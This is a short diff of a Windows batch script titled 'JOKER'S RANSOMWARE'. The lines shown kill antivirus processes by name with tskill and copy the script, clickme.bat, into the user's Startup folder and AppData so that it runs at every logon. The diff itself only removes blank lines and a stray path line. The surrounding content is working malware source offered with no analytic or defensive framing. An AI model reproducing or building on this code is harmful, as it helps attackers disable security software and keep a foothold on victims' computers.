@@ -208,12 +208,10 @@ tskill /A avas*
 tskill /A norm*
 cls
 tskill /A offg*
-cls 
-
-
-software\*.*                                           
+cls                                           
 ::end
 rem
+
 title JOKER'S RANSOMWARE
 xcopy clickme.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup" /h /y
 xcopy /h /y clickme.bat "%userprofile%\AppData"
